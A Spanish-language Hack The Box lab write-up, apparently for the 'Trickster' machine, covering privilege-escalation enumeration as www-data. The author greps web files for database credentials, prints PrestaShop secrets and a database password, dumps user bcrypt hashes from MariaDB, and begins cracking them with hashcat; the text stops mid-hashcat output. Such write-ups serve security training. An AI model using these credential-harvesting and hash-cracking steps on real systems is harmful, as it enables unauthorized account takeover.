<!DOCTYPE html> <html><head>
		<title>2.PrivEsc</title>
		<base href="../../">
		<meta id="root-path" root-path="../../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="HTB - 2.PrivEsc">
		<meta property="og:title" content="2.PrivEsc">
		<meta property="og:description" content="HTB - 2.PrivEsc">
		<meta property="og:type" content="website">
		<meta property="og:url" content="machines/trickster/2.privesc.html">
		<meta property="og:image" content="machines/trickster/imgs/pasted-image-20250213163524.png">
		<meta property="og:site_name" content="HTB">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="2.PrivEsc"><p dir="auto">2.PrivEsc</p></h1><div class="el-h2 heading-wrapper"><h2 data-heading="Directorio web" dir="auto" class="heading" id="Directorio_web"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Directorio web</h2><div class="heading-children"><div class="el-p"><p dir="auto">Directorio /var/www</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">www-data@trickster:~$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">20</span>
drwxr-xr-x  <span class="token number">5</span> root     root     <span class="token number">4096</span> Sep <span class="token number">13</span> <span class="token number">12</span>:24 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root     root     <span class="token number">4096</span> Sep <span class="token number">13</span> <span class="token number">12</span>:24 <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">2</span> root     root     <span class="token number">4096</span> Sep <span class="token number">13</span> <span class="token number">12</span>:24 html
drwxr-xr-x <span class="token number">28</span> www-data www-data <span class="token number">4096</span> Sep <span class="token number">17</span> <span class="token number">18</span>:07 prestashop
drwxr-xr-x  <span class="token number">5</span> www-data www-data <span class="token number">4096</span> Feb <span class="token number">13</span> <span class="token number">15</span>:09 trickster
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="SUID Binaries / GUID Bins" dir="auto" class="heading" id="SUID_Binaries_/_GUID_Bins"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SUID Binaries / GUID Bins</h2><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">www-data@trickster:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/usr/libexec/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">GUID</p></div><div class="el-pre"><pre><code data-line="0">www-data@trickster:~$ find / -perm -2000 -print 2&gt;/dev/null
/var/spool/postfix/public
/var/mail
/var/local
/var/log/journal
/var/log/journal/add7a2fa4f114fc2b05f9d28de9f9bb3
/var/log/mysql
/run/log/journal
/snap/core20/2379/usr/bin/chage
/snap/core20/2379/usr/bin/expiry
/snap/core20/2379/usr/bin/ssh-agent
/snap/core20/2379/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2379/usr/sbin/unix_chkpwd
/snap/core20/2379/var/mail
/snap/core20/2318/usr/bin/chage
/snap/core20/2318/usr/bin/expiry
/snap/core20/2318/usr/bin/ssh-agent
/snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2318/usr/sbin/unix_chkpwd
/snap/core20/2318/var/mail
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/crontab
/usr/bin/chage
/usr/bin/ssh-agent
/usr/sbin/postqueue
/usr/sbin/unix_chkpwd
/usr/sbin/postdrop
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/local/share/fonts

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Conexiones tcp/udp" dir="auto" class="heading" id="Conexiones_tcp/udp"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Conexiones tcp/udp</h2><div class="heading-children"><div class="el-p"><p dir="auto">Revisamos las conexiones de la maquina</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">$ <span class="token function">netstat</span> <span class="token parameter variable">-tulnp</span>
<span class="token punctuation">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="token punctuation">)</span>
Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:3306          <span class="token number">0.0</span>.0.0:*               LISTEN      -                   
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      -                   
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:41935         <span class="token number">0.0</span>.0.0:*               LISTEN      -                   
tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.53:53           <span class="token number">0.0</span>.0.0:*               LISTEN      -                   
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::80                   :::*                    LISTEN      -                   
tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::22                   :::*                    LISTEN      -                   
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.53:53           <span class="token number">0.0</span>.0.0:*                           -                   
udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:68              <span class="token number">0.0</span>.0.0:*                           -              
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Parece que hay un mysql abierto; era de esperar porque es necesario para el funcionamiento de la pagina web.</p></div><div class="el-p"><p dir="auto">Vamos a hacer un fuzzeo del directorio de Prestashop para buscar algo relacionado con una base de datos ; seguramente mysql que es la que funciona en el puerto 3306:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token function">grep</span> <span class="token parameter variable">-ri</span> <span class="token string">"mysql"</span> /var/www/
<span class="token function">grep</span> <span class="token parameter variable">-risE</span> <span class="token string">"(mysql|dbname|db_user|db_password|db_host|database)"</span> /var/www/
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Encuentro informacion interesante en la siguiente ruta</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">/var/www/prestashop/var/cache/prod/FrontContainer.php
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">        <span class="token builtin class-name">return</span> <span class="token punctuation">[</span>
            <span class="token string">'database_host'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'127.0.0.1'</span>,
            <span class="token string">'database_port'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">''</span>,
            <span class="token string">'database_name'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'prestashop'</span>,
            <span class="token string">'database_user'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'ps_user'</span>,
            <span class="token string">'database_password'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'prest@shop_o'</span>,
            <span class="token string">'database_prefix'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'ps_'</span>,
            <span class="token string">'database_engine'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'InnoDB'</span>,
            <span class="token string">'mailer_transport'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'smtp'</span>,
            <span class="token string">'mailer_host'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'127.0.0.1'</span>,
            <span class="token string">'mailer_user'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> NULL,
            <span class="token string">'mailer_password'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> NULL,
            <span class="token string">'secret'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog'</span>,
            <span class="token string">'ps_caching'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'CacheMemcache'</span>,
            <span class="token string">'ps_cache_enable'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> false,
            <span class="token string">'ps_creation_date'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'2024-05-25'</span>,
            <span class="token string">'locale'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'en-US'</span>,
            <span class="token string">'use_debug_toolbar'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> true,
            <span class="token string">'cookie_key'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i'</span>,
            <span class="token string">'cookie_iv'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g'</span>,
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="MariaDB" dir="auto" class="heading" id="MariaDB"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>MariaDB</h2><div class="heading-children"><div class="el-p"><p dir="auto">Bueno como dirian mis colegas del sector "we're in"<br>
<span alt="Pasted image 20250213163524.png" src="Pasted image 20250213163524.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250213163524.png" src="machines/trickster/imgs/pasted-image-20250213163524.png"></span></p></div><div class="el-pre"><pre class="language-mysql" tabindex="0"><code data-line="0" class="language-mysql is-loaded">MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">De la base de datos saco las siguientes credenciales;</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">admin@trickster.htb <span class="token builtin class-name">:</span> <span class="token variable">$2y</span><span class="token variable">$10</span><span class="token variable">$P8wO3jruKKpvKRgWP6o7o</span>.rojbDoABG9StPUt0dR7LIeK26RdlB/C
james@trickster.htb <span class="token builtin class-name">:</span> <span class="token variable">$2a</span><span class="token variable">$04</span><span class="token variable">$rgBYAsSHUVK3RZKfwbYY9OPJyBbt</span>/OzGw9UHi4UnlK6yG5LyunCmm
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Identificamos los hashes:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  Trickster hashcat credentials 
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting <span class="token keyword">in</span> autodetect mode

OpenCL API <span class="token punctuation">(</span>OpenCL <span class="token number">3.0</span> PoCL <span class="token number">6.0</span>+debian  Linux, None+Asserts, RELOC, LLVM <span class="token number">18.1</span>.8, SLEEF, DISTRO, POCL_DEBUG<span class="token punctuation">)</span> - Platform <span class="token comment">#1 [The pocl project]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
* Device <span class="token comment">#1: cpu-haswell-AMD Custom APU 0405, 6360/12785 MB (2048 MB allocatable), 8MCU</span>

The following <span class="token number">4</span> hash-modes match the structure of your input hash:

      <span class="token comment"># | Name                                                       | Category</span>
  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
   <span class="token number">3200</span> <span class="token operator">|</span> bcrypt <span class="token variable">$2</span>*$, Blowfish <span class="token punctuation">(</span>Unix<span class="token punctuation">)</span>                               <span class="token operator">|</span> Operating System
  <span class="token number">25600</span> <span class="token operator">|</span> bcrypt<span class="token punctuation">(</span>md5<span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">))</span> / bcryptmd5                             <span class="token operator">|</span> Forums, CMS, E-Commerce
